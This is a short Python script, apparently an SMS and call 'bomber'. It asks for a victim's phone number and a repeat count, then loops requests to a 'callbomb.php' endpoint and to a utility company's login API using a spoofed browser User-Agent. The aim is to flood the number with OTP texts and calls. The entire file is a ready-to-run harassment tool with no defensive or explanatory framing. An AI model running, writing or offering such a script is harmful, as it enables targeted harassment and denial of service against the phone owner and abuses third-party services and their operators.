import requests

# GET
number=str(input(" Enter Your Number:"))

api1=("http://api.delwarcoxit.com/callbomb.php?phone="+number)


#Post

api2 = "http://nesco.sslwireless.com/api/v1/login"
headers2 = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36'}
data2 = {'phone_number':number}


amount=int(input("Enter Your Amount :"))

for i in range(amount):
 requests.get(api1)
 requests.post(api2,headers=headers2,json=data2)
 print(str(i+1)+" SMS Sent")